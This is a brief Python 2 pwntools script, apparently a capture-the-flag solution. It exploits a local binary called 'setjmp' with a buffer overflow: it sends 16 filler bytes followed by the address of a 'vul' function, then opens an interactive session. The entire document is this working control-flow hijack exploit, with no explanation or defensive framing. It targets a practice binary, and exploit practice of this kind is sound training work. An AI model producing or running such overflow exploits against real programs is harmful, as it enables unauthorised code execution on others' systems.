#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level = "debug"
e = ELF('setjmp')
print hex(e.symbols['vul'])
payload='a'*16+p64(e.symbols['vul'])
p = process('./setjmp')
p.recvuntil("plz input:\n")
p.sendline(payload)
p.interactive()
